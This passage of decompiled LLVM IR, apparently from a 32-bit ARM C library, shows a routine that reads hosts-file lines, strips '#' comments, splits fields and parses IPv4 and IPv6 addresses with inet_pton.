  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_16f68 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_16f68, align 4
  %v0_16f6c = call i32 @__errno_location()
  store i32 %v0_16f6c, i32* %r0.global-to-local, align 4
  %v1_16f70 = inttoptr i32 %v0_16f6c to i32*
  %v2_16f70 = load i32, i32* %v1_16f70, align 4
  store i32 %v2_16f70, i32* @sl, align 4
  br label %dec_label_pc_171a0

dec_label_pc_16f78:                               ; preds = %dec_label_pc_17128
  %v0_16f78 = load i32, i32* @r4, align 4
  %v1_16f78 = add i32 %v0_16f78, 4
  %v2_16f78 = inttoptr i32 %v1_16f78 to i32*
  %v3_16f78 = load i32, i32* %v2_16f78, align 4
  %v1_16f7c = load i32, i32* @sb, align 4
  %v2_16f7c = inttoptr i32 %v1_16f7c to i32*
  store i32 %v3_16f78, i32* %v2_16f7c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* @ip, align 4
  %v0_16f90 = load i32, i32* @r4, align 4
  %v1_16f90 = add i32 %v0_16f90, 8
  store i32 %v1_16f90, i32* %r1.global-to-local, align 4
  %v1_16f94 = load i32, i32* @sb, align 4
  %v2_16f94 = add i32 %v1_16f94, 8
  %v3_16f94 = inttoptr i32 %v2_16f94 to i32*
  store i32 2, i32* %v3_16f94, align 4
  %v0_16f98 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16f98, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_16fa0 = load i32, i32* @sb, align 4
  %v1_16fa0 = load i32, i32* @ip, align 4
  %v2_16fa0 = inttoptr i32 %v1_16fa0 to i32*
  store i32 %v0_16fa0, i32* %v2_16fa0, align 4
  %v0_16fa4 = load i32, i32* @r7, align 4
  %v1_16fa4 = load i32, i32* %r0.global-to-local, align 4
  %v2_16fa4 = inttoptr i32 %v1_16fa4 to i32*
  store i32 %v0_16fa4, i32* %v2_16fa4, align 4
  %v0_16fa8 = load i32, i32* %r3.global-to-local, align 4
  %v1_16fa8 = load i32, i32* @sb, align 4
  %v2_16fa8 = add i32 %v1_16fa8, 12
  %v3_16fa8 = inttoptr i32 %v2_16fa8 to i32*
  store i32 %v0_16fa8, i32* %v3_16fa8, align 4
  %v0_16fac = load i32, i32* %r0.global-to-local, align 4
  %v1_16fac = load i32, i32* @sb, align 4
  %v2_16fac = add i32 %v1_16fac, 16
  %v3_16fac = inttoptr i32 %v2_16fac to i32*
  store i32 %v0_16fac, i32* %v3_16fac, align 4
  %v0_16fb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16fb0 = load i32, i32* @sb, align 4
  %v2_16fb0 = add i32 %v1_16fb0, 4
  %v3_16fb0 = inttoptr i32 %v2_16fb0 to i32*
  store i32 %v0_16fb0, i32* %v3_16fb0, align 4
  %v0_16fb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_16fb4 = load i32, i32* %r0.global-to-local, align 4
  %v2_16fb4 = add i32 %v1_16fb4, 4
  %v3_16fb4 = inttoptr i32 %v2_16fb4 to i32*
  store i32 %v0_16fb4, i32* %v3_16fb4, align 4
  br label %dec_label_pc_17184

dec_label_pc_16fbc:                               ; preds = %dec_label_pc_17150
  %v0_16fc0 = load i32, i32* @r4, align 4
  %v1_16fc0 = add i32 %v0_16fc0, 4
  %v2_16fc0 = inttoptr i32 %v1_16fc0 to i32*
  %v3_16fc0 = load i32, i32* %v2_16fc0, align 4
  store i32 %v3_16fc0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_16fc8 = load i32, i32* @sb, align 4
  %v2_16fc8 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_16fc8, i32* %v2_16fc8, align 4
  store i32 %v0_17020, i32* @ip, align 4
  %v0_16fd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16fd0 = load i32, i32* @sb, align 4
  %v2_16fd0 = inttoptr i32 %v1_16fd0 to i32*
  store i32 %v0_16fd0, i32* %v2_16fd0, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_16fdc = load i32, i32* @ip, align 4
  %v1_16fdc = load i32, i32* %r0.global-to-local, align 4
  %v2_16fdc = inttoptr i32 %v1_16fdc to i32*
  store i32 %v0_16fdc, i32* %v2_16fdc, align 4
  %v0_16fe0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16fe0 = load i32, i32* @sb, align 4
  %v2_16fe0 = add i32 %v1_16fe0, 12
  %v3_16fe0 = inttoptr i32 %v2_16fe0 to i32*
  store i32 %v0_16fe0, i32* %v3_16fe0, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_16fec = load i32, i32* @r4, align 4
  %v1_16fec = add i32 %v0_16fec, 8
  store i32 %v1_16fec, i32* %r1.global-to-local, align 4
  %v0_16ff0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16ff0, i32* @sl, align 4
  %v1_16ff4 = load i32, i32* @sb, align 4
  %v2_16ff4 = add i32 %v1_16ff4, 8
  %v3_16ff4 = inttoptr i32 %v2_16ff4 to i32*
  store i32 10, i32* %v3_16ff4, align 4
  %v0_16ff8 = load i32, i32* %r3.global-to-local, align 4
  %v1_16ff8 = load i32, i32* @sb, align 4
  %v2_16ff8 = add i32 %v1_16ff8, 16
  %v3_16ff8 = inttoptr i32 %v2_16ff8 to i32*
  store i32 %v0_16ff8, i32* %v3_16ff8, align 4
  %v0_16ffc = load i32, i32* %r1.global-to-local, align 4
  %v1_16ffc = load i32, i32* @sb, align 4
  %v2_16ffc = add i32 %v1_16ffc, 4
  %v3_16ffc = inttoptr i32 %v2_16ffc to i32*
  store i32 %v0_16ffc, i32* %v3_16ffc, align 4
  %v0_17000 = load i32, i32* %r2.global-to-local, align 4
  %v1_17000 = load i32, i32* %r3.global-to-local, align 4
  %v2_17000 = add i32 %v1_17000, 4
  %v3_17000 = inttoptr i32 %v2_17000 to i32*
  store i32 %v0_17000, i32* %v3_17000, align 4
  br label %dec_label_pc_17184

dec_label_pc_17008:                               ; preds = %dec_label_pc_16ed0
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_17014

dec_label_pc_17014:                               ; preds = %.thread, %dec_label_pc_17008
  %v2_17024.pre-phi = phi i32* [ %v2_16ef0, %.thread ], [ %.pre, %dec_label_pc_17008 ]
  %v0_17020 = phi i32 [ %v1_16f4c, %.thread ], [ 0, %dec_label_pc_17008 ]
  %stack_var_-40.1 = phi i32 [ %v1_16f58, %.thread ], [ 0, %dec_label_pc_17008 ]
  %stack_var_-48.1 = phi i32 [ %v1_16f54, %.thread ], [ 0, %dec_label_pc_17008 ]
  %stack_var_-52.0 = phi i32 [ %v0_16f40, %.thread ], [ %v0_16ea0, %dec_label_pc_17008 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* @ip, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_17024.pre-phi, align 4
  %v2_170e8 = inttoptr i32 %v0_16ea4 to i8*
  %v7_17120 = icmp eq i32 %v0_16e9c, 2
  %v7_17148 = icmp eq i32 %v0_16e9c, 10
  br label %dec_label_pc_1716c

dec_label_pc_1702c:                               ; preds = %dec_label_pc_1716c
  %v0_1702c = load i32, i32* @fp, align 4
  store i32 %v0_1702c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_17034 = call i32 @__GI_strchr(i32 %v0_1702c, i32 35)
  store i32 %v2_17034, i32* %r0.global-to-local, align 4
  %v3_17038 = icmp eq i32 %v2_17034, 0
  br i1 %v3_17038, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1702c
  %v0_1704011 = load i32, i32* @fp, align 4
  store i32 %v0_1704011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_170ac.preheader

bb75:                                             ; preds = %dec_label_pc_1702c
  %v3_17034 = inttoptr i32 %v2_17034 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17040 = load i32, i32* @fp, align 4
  store i32 %v0_17040, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_17034, align 1
  %v0_170ac30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_170ac.preheader

dec_label_pc_170ac.preheader:                     ; preds = %bb75, %.thread10
  %v0_170ac30 = phi i32 [ %v0_170ac30.pre, %bb75 ], [ %v0_1704011, %.thread10 ]
  %v1_170ac31 = inttoptr i32 %v0_170ac30 to i8*
  %v2_170ac32 = load i8, i8* %v1_170ac31, align 1
  %v3_170ac33 = zext i8 %v2_170ac32 to i32
  store i32 %v3_170ac33, i32* %r3.global-to-local, align 4
  %v2_170b034 = icmp eq i8 %v2_170ac32, 0
  br i1 %v2_170b034, label %dec_label_pc_170b8, label %dec_label_pc_17058.preheader

dec_label_pc_17050:                               ; preds = %dec_label_pc_17064
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_17054 = inttoptr i32 %v8_1707c to i8*
  store i8 0, i8* %v3_17054, align 1
  %v4_17054 = load i32, i32* %r2.global-to-local, align 4
  %v5_17054 = add i32 %v4_17054, 1
  store i32 %v5_17054, i32* %r2.global-to-local, align 4
  %v1_17058 = inttoptr i32 %v5_17054 to i8*
  %v2_17058 = load i8, i8* %v1_17058, align 1
  %v3_17058 = zext i8 %v2_17058 to i32
  store i32 %v3_17058, i32* %r1.global-to-local, align 4
  %v2_1705c = icmp eq i8 %v2_17058, 0
  br i1 %v2_1705c, label %dec_label_pc_170b8, label %dec_label_pc_17064

dec_label_pc_17064:                               ; preds = %dec_label_pc_17058.preheader, %dec_label_pc_17050
  %v8_1707c = phi i32 [ %v5_17054, %dec_label_pc_17050 ], [ %v0_1705820, %dec_label_pc_17058.preheader ]
  %v1_1706c = phi i32 [ %v3_17058, %dec_label_pc_17050 ], [ %v3_1705823, %dec_label_pc_17058.preheader ]
  %v2_17068 = load i32, i32* @global_var_237ac, align 4
  store i32 %v2_17068, i32* %r3.global-to-local, align 4
  %v3_1706c = mul nuw nsw i32 %v1_1706c, 2
  %v4_1706c = add i32 %v3_1706c, %v2_17068
  %v5_1706c = inttoptr i32 %v4_1706c to i8*
  %v6_1706c = load i8, i8* %v5_1706c, align 1
  %v8_1706c = zext i8 %v6_1706c to i32
  store i32 %v8_1706c, i32* %r3.global-to-local, align 4
  %v1_17070 = and i32 %v8_1706c, 32
  %v2_17070 = icmp eq i32 %v1_17070, 0
  br i1 %v2_17070, label %dec_label_pc_17078, label %dec_label_pc_17050

dec_label_pc_17078:                               ; preds = %dec_label_pc_17064
  %v0_17078 = load i32, i32* @r6, align 4
  %v7_1707c = icmp slt i32 %v0_17078, 7
  br i1 %v7_1707c, label %bb76, label %dec_label_pc_1708c.preheader

bb76:                                             ; preds = %dec_label_pc_17078
  %v9_1707c = load i32, i32* @r4, align 4
  %v13_1707c = mul i32 %v0_17078, 4
  %v14_1707c = add i32 %v9_1707c, %v13_1707c
  %v15_1707c = inttoptr i32 %v14_1707c to i32*
  store i32 %v8_1707c, i32* %v15_1707c, align 4
  %v8_17080 = load i32, i32* @r6, align 4
  %v9_17080 = add i32 %v8_17080, 1
  store i32 %v9_17080, i32* @r6, align 4
  %v0_1708c25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1708c.preheader

dec_label_pc_1708c.preheader:                     ; preds = %bb76, %dec_label_pc_17078
  %v0_1708c25 = phi i32 [ %v0_1708c25.pre, %bb76 ], [ %v8_1707c, %dec_label_pc_17078 ]
  %v1_1708c26 = inttoptr i32 %v0_1708c25 to i8*
  %v2_1708c27 = load i8, i8* %v1_1708c26, align 1
  %v3_1708c28 = zext i8 %v2_1708c27 to i32
  store i32 %v3_1708c28, i32* %r1.global-to-local, align 4
  %v2_1709029 = icmp eq i8 %v2_1708c27, 0
  br i1 %v2_1709029, label %dec_label_pc_170ac.loopexit, label %dec_label_pc_17098.lr.ph

dec_label_pc_17098.lr.ph:                         ; preds = %dec_label_pc_1708c.preheader
  %v2_1709c.pre = load i32, i32* @global_var_237ac, align 4
  br label %dec_label_pc_17098

dec_label_pc_17088:                               ; preds = %dec_label_pc_17098
  %v1_17088 = add i32 %v0_17088, 1
  store i32 %v1_17088, i32* %r2.global-to-local, align 4
  %v1_1708c = inttoptr i32 %v1_17088 to i8*
  %v2_1708c = load i8, i8* %v1_1708c, align 1
  %v3_1708c = zext i8 %v2_1708c to i32
  store i32 %v3_1708c, i32* %r1.global-to-local, align 4
  %v2_17090 = icmp eq i8 %v2_1708c, 0
  br i1 %v2_17090, label %dec_label_pc_170ac.loopexit, label %dec_label_pc_17098

dec_label_pc_17098:                               ; preds = %dec_label_pc_17098.lr.ph, %dec_label_pc_17088
  %v0_17088 = phi i32 [ %v0_1708c25, %dec_label_pc_17098.lr.ph ], [ %v1_17088, %dec_label_pc_17088 ]
  %v1_170a0 = phi i32 [ %v3_1708c28, %dec_label_pc_17098.lr.ph ], [ %v3_1708c, %dec_label_pc_17088 ]
  store i32 %v2_1709c.pre, i32* %r3.global-to-local, align 4
  %v3_170a0 = mul nuw nsw i32 %v1_170a0, 2
  %v4_170a0 = add i32 %v3_170a0, %v2_1709c.pre
  %v5_170a0 = inttoptr i32 %v4_170a0 to i8*
  %v6_170a0 = load i8, i8* %v5_170a0, align 1
  %v8_170a0 = zext i8 %v6_170a0 to i32
  store i32 %v8_170a0, i32* %r3.global-to-local, align 4
  %v1_170a4 = and i32 %v8_170a0, 32
  %v2_170a4 = icmp eq i32 %v1_170a4, 0
  br i1 %v2_170a4, label %dec_label_pc_17088, label %dec_label_pc_170ac.loopexit

dec_label_pc_170ac.loopexit:                      ; preds = %dec_label_pc_17098, %dec_label_pc_17088, %dec_label_pc_1708c.preheader
  %v0_170ac = phi i32 [ %v0_1708c25, %dec_label_pc_1708c.preheader ], [ %v0_17088, %dec_label_pc_17098 ], [ %v1_17088, %dec_label_pc_17088 ]
  %v1_170ac = inttoptr i32 %v0_170ac to i8*
  %v2_170ac = load i8, i8* %v1_170ac, align 1
  %v3_170ac = zext i8 %v2_170ac to i32
  store i32 %v3_170ac, i32* %r3.global-to-local, align 4
  %v2_170b0 = icmp eq i8 %v2_170ac, 0
  br i1 %v2_170b0, label %dec_label_pc_170b8, label %dec_label_pc_17058.preheader

dec_label_pc_17058.preheader:                     ; preds = %dec_label_pc_170ac.preheader, %dec_label_pc_170ac.loopexit
  %v0_1705820 = phi i32 [ %v0_170ac, %dec_label_pc_170ac.loopexit ], [ %v0_170ac30, %dec_label_pc_170ac.preheader ]
  %v1_1705821 = inttoptr i32 %v0_1705820 to i8*
  %v2_1705822 = load i8, i8* %v1_1705821, align 1
  %v3_1705823 = zext i8 %v2_1705822 to i32
  store i32 %v3_1705823, i32* %r1.global-to-local, align 4
  %v2_1705c24 = icmp eq i8 %v2_1705822, 0
  br i1 %v2_1705c24, label %dec_label_pc_170b8, label %dec_label_pc_17064

dec_label_pc_170b8:                               ; preds = %dec_label_pc_170ac.loopexit, %dec_label_pc_17058.preheader, %dec_label_pc_17050, %dec_label_pc_170ac.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_170bc = load i32, i32* @r6, align 4
  %v1_170c0 = load i32, i32* @r4, align 4
  %v5_170c0 = mul i32 %v0_170bc, 4
  %v6_170c0 = add i32 %v1_170c0, %v5_170c0
  %v7_170c0 = inttoptr i32 %v6_170c0 to i32*
  store i32 0, i32* %v7_170c0, align 4
  %v7_170c4 = icmp sgt i32 %v0_170bc, 1
  br i1 %v7_170c4, label %dec_label_pc_170c8, label %dec_label_pc_1716c

dec_label_pc_170c8:                               ; preds = %dec_label_pc_170b8
  %v2_170c8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_170c8, i32* %r0.global-to-local, align 4
  %v7_170cc = icmp eq i32 %v2_170c8, 1
  br i1 %v7_170cc, label %dec_label_pc_171a0, label %dec_label_pc_170d4

dec_label_pc_170d4:                               ; preds = %dec_label_pc_170c8
  %v7_170d4 = icmp eq i32 %v2_170c8, 2
  br i1 %v7_170d4, label %dec_label_pc_170e0, label %dec_label_pc_1710c.preheader

dec_label_pc_1710c.preheader:                     ; preds = %dec_label_pc_170d4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1710c

dec_label_pc_170e0:                               ; preds = %dec_label_pc_170d4
  store i32 %v0_16ea4, i32* %r0.global-to-local, align 4
  %v0_170e4 = load i32, i32* @r4, align 4
  %v1_170e4 = inttoptr i32 %v0_170e4 to i32*
  %v2_170e4 = load i32, i32* %v1_170e4, align 4
  store i32 %v2_170e4, i32* @r1, align 4
  %v3_170e8 = call i32 @__GI_strcoll(i8* %v2_170e8, i32 %v2_170e4)
  store i32 %v3_170e8, i32* %r0.global-to-local, align 4
  %v2_170ec = icmp eq i32 %v3_170e8, 0
  br i1 %v2_170ec, label %dec_label_pc_1711c, label %dec_label_pc_1716c

dec_label_pc_170f8:                               ; preds = %dec_label_pc_1710c
  %v0_170f8 = load i32, i32* @r4, align 4
  %v4_170f8 = mul i32 %v1_170f8, 4
  %v5_170f8 = add i32 %v0_170f8, %v4_170f8
  %v6_170f8 = inttoptr i32 %v5_170f8 to i32*
  %v7_170f8 = load i32, i32* %v6_170f8, align 4
  store i32 %v7_170f8, i32* %r1.global-to-local, align 4
  %v3_170fc = call i32 @__GI_strcasecmp(i8* %v2_170e8, i32 %v7_170f8)
  store i32 %v3_170fc, i32* %r0.global-to-local, align 4
  %v2_17100 = icmp eq i32 %v3_170fc, 0
  %v0_17104 = load i32, i32* @r5, align 4
  %v1_17104 = add i32 %v0_17104, 1
  store i32 %v1_17104, i32* @r5, align 4
  br i1 %v2_17100, label %dec_label_pc_1711c, label %dec_label_pc_1710c

dec_label_pc_1710c:                               ; preds = %dec_label_pc_1710c.preheader, %dec_label_pc_170f8
  %v1_170f8 = phi i32 [ 1, %dec_label_pc_1710c.preheader ], [ %v1_17104, %dec_label_pc_170f8 ]
  %v1_1710c = load i32, i32* @r6, align 4
  store i32 %v0_16ea4, i32* %r0.global-to-local, align 4
  %v5_17114 = icmp slt i32 %v1_170f8, %v1_1710c
  br i1 %v5_17114, label %dec_label_pc_170f8, label %dec_label_pc_1716c

dec_label_pc_1711c:                               ; preds = %dec_label_pc_170f8, %dec_label_pc_170e0
  store i32 %v0_16e9c, i32* %r1.global-to-local, align 4
  br i1 %v7_17120, label %dec_label_pc_17128, label %dec_label_pc_17144

dec_label_pc_17128:                               ; preds = %dec_label_pc_1711c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1712c = load i32, i32* @r7, align 4
  store i32 %v0_1712c, i32* %r2.global-to-local, align 4
  %v0_17130 = load i32, i32* @r4, align 4
  %v1_17130 = inttoptr i32 %v0_17130 to i32*
  %v2_17130 = load i32, i32* %v1_17130, align 4
  store i32 %v2_17130, i32* %r1.global-to-local, align 4
  %v3_17134 = inttoptr i32 %v2_17130 to i8*
  %v4_17134 = call i32 @inet_pton(i32 2, i8* %v3_17134, i32 %v0_1712c)
  store i32 %v4_17134, i32* %r0.global-to-local, align 4
  %v5_1713c = icmp sgt i32 %v4_17134, 0
  br i1 %v5_1713c, label %dec_label_pc_16f78, label %dec_label_pc_17168

dec_label_pc_17144:                               ; preds = %dec_label_pc_1711c
  store i32 %v0_16e9c, i32* %r2.global-to-local, align 4
  br i1 %v7_17148, label %dec_label_pc_17150, label %dec_label_pc_17168

dec_label_pc_17150:                               ; preds = %dec_label_pc_17144
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_17154 = load i32, i32* @r4, align 4
  %v1_17154 = inttoptr i32 %v0_17154 to i32*
  %v2_17154 = load i32, i32* %v1_17154, align 4
  store i32 %v2_17154, i32* %r1.global-to-local, align 4
  store i32 %v0_17020, i32* %r2.global-to-local, align 4
  %v3_1715c = inttoptr i32 %v2_17154 to i8*
  %v4_1715c = call i32 @inet_pton(i32 10, i8* %v3_1715c, i32 %v0_17020)
  store i32 %v4_1715c, i32* %r0.global-to-local, align 4
  %v5_17164 = icmp sgt i32 %v4_1715c, 0
  br i1 %v5_17164, label %dec_label_pc_16fbc, label %dec_label_pc_17168

dec_label_pc_17168:                               ; preds = %dec_label_pc_17128, %dec_label_pc_17144, %dec_label_pc_17150
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1716c

dec_label_pc_1716c:                               ; preds = %dec_label_pc_1710c, %dec_label_pc_170e0, %dec_label_pc_170b8, %dec_label_pc_17168, %dec_label_pc_17014
  %v0_1716c = load i32, i32* @fp, align 4
  store i32 %v0_1716c, i32* %r0.global-to-local, align 4
  %v0_17170 = load i32, i32* @r8, align 4
  store i32 %v0_17170, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_17178 = call i32 @fgets(i32 %v0_1716c, i32 %v0_17170, i32 %stack_var_-52.0)
  store i32 %v3_17178, i32* %r0.global-to-local, align 4
  %v2_1717c = icmp eq i32 %v3_17178, 0
  br i1 %v2_1717c, label %dec_label_pc_17184, label %dec_label_pc_1702c

dec_label_pc_17184:                               ; preds = %dec_label_pc_1716c, %dec_label_pc_16fbc, %dec_label_pc_16f78
  %v2_17184 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_17184, i32* %r3.global-to-local, align 4
  %v7_17188 = icmp eq i32 %v2_17184, 1
  br i1 %v7_17188, label %dec_label_pc_171a0, label %dec_label_pc_17190

dec_label_pc_17190:                               ; preds = %dec_label_pc_17184
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_17194 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_17194 = call i32 @__GI_fclose(i8* %v1_17194)
  store i32 %v2_17194, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171a0

dec_label_pc_1719c:                               ; preds = %dec_label_pc_16eb8, %bb74, %dec_label_pc_16f0c, %dec_label_pc_16f04, %dec_label_pc_16ef8, %dec_label_pc_16ee4, %dec_label_pc_16ec8
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_171a0

dec_label_pc_171a0:                               ; preds = %dec_label_pc_170c8, %dec_label_pc_17184, %dec_label_pc_17190, %dec_label_pc_16f60, %dec_label_pc_1719c
  %v0_171a0 = load i32, i32* @sl, align 4
  store i32 %v0_171a0, i32* %r0.global-to-local, align 4
  store i32 %v3_16e88, i32* @r4, align 4
  store i32 %v6_16e88, i32* @r5, align 4
  store i32 %v12_16e88, i32* @r7, align 4
  store i32 %v15_16e88, i32* @r8, align 4
  store i32 %v21_16e88, i32* @sl, align 4
  store i32 %v24_16e88, i32* @fp, align 4
  ret i32 %v0_171a0

; uselistorder directives
  uselistorder i32 %v1_170f8, { 1, 0 }
  uselistorder i32 %v0_170bc, { 1, 0 }
  uselistorder i32 %v3_1705823, { 1, 0 }
  uselistorder i32 %v0_1705820, { 1, 0 }
  uselistorder i32 %v2_17034, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_16f34, { 1, 0 }
  uselistorder i32 %v0_16ef8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16edc, { 1, 0 }
  uselistorder i32 %v0_16ea8, { 1, 0, 2 }
  uselistorder i32 %v0_16e9c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16e98, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 16, 4, 5, 9, 10, 13, 11, 14, 12, 15, 0, 1, 2, 3, 6, 7, 8, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 11, 2, 5, 6, 7, 13, 8, 14, 9, 10, 0, 1, 3, 4, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32 34, { 6, 2, 3, 0, 7, 8, 5, 1, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 3, 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 16, 17, 18, 19, 0, 20, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 7, { 2, 21, 22, 11, 12, 13, 0, 17, 24, 20, 1, 3, 4, 5, 18, 19, 8, 14, 15, 6, 7, 16, 10, 9, 23 }
  uselistorder i32* @global_var_237ac, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 2, 3, 1 }
  uselistorder i32 10, { 3, 4, 38, 5, 6, 39, 40, 41, 42, 43, 30, 14, 29, 7, 44, 1, 45, 46, 47, 48, 12, 15, 35, 16, 36, 17, 18, 19, 0, 31, 32, 20, 27, 28, 37, 9, 21, 13, 33, 34, 11, 10, 2, 49, 22, 8, 24, 25, 23, 26, 50 }
  uselistorder i32 12, { 47, 48, 49, 0, 50, 7, 51, 19, 12, 13, 3, 54, 14, 10, 70, 71, 72, 73, 74, 75, 11, 76, 77, 78, 79, 80, 81, 15, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 5, 4, 41, 42, 43, 16, 20, 46, 63, 21, 22, 64, 65, 66, 1, 23, 67, 8, 68, 9, 24, 2, 69, 17, 55, 56, 57, 58, 82, 6, 44, 52, 53, 25, 26, 27, 28, 29, 30, 45, 59, 60, 61, 18, 62 }
  uselistorder i32* @sb, { 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 4, 26, 27, 28, 29, 30, 31, 32, 33, 34, 5, 6, 35, 36, 37, 38, 39, 40, 1, 2, 7, 8, 9, 10, 11, 12, 0, 13 }
  uselistorder i32 80, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32 48, { 15, 5, 18, 2, 10, 11, 12, 3, 6, 13, 7, 19, 17, 14, 1, 0, 16, 8, 9, 4 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 4, 1, 14, 0, 8, 9, 10, 2, 3, 5, 6, 7 }
  uselistorder i32 56, { 4, 3, 6, 2, 7, 1, 0, 8, 5 }
  uselistorder i32 44, { 9, 10, 11, 7, 8, 15, 1, 6, 14, 13, 0, 12, 2, 3, 4, 5 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 62, 63, 64, 0, 65, 66, 42, 74, 35, 75, 30, 31, 27, 51, 36, 52, 53, 45, 46, 4, 3, 6, 5, 8, 7, 1, 28, 69, 67, 68, 54, 19, 55, 2, 37, 56, 57, 58, 59, 60, 20, 61, 43, 44, 70, 71, 72, 73, 76, 38, 47, 39, 29, 48, 49, 50, 10, 9, 21, 32, 40, 22, 12, 11, 14, 13, 23, 16, 15, 24, 25, 18, 17, 26, 33, 34, 41 }
  uselistorder i32* @fp, { 39, 42, 40, 1, 41, 43, 44, 45, 46, 0, 48, 47, 49, 50, 51, 20, 2, 52, 53, 54, 55, 56, 57, 58, 3, 4, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 33, 34, 35, 36, 37, 38, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 111, 112, 110, 105, 106, 107, 108, 109 }
  uselistorder i32* @sl, { 23, 24, 25, 26, 29, 27, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 4, 39, 40, 0, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 5, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 6, 7, 8, 9, 10, 11, 12, 1, 13, 14, 15, 16, 17, 2, 18, 19, 20, 21, 22 }
  uselistorder i32* @r8, { 32, 33, 34, 35, 36, 37, 38, 6, 7, 8, 39, 44, 45, 0, 46, 81, 82, 83, 84, 1, 85, 86, 87, 88, 20, 21, 96, 97, 9, 10, 11, 12, 13, 14, 15, 95, 89, 90, 91, 92, 93, 94, 3, 22, 23, 24, 25, 26, 27, 4, 5, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 2, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 28, 29, 30, 31, 40, 41, 42, 43, 16, 17, 18, 19 }
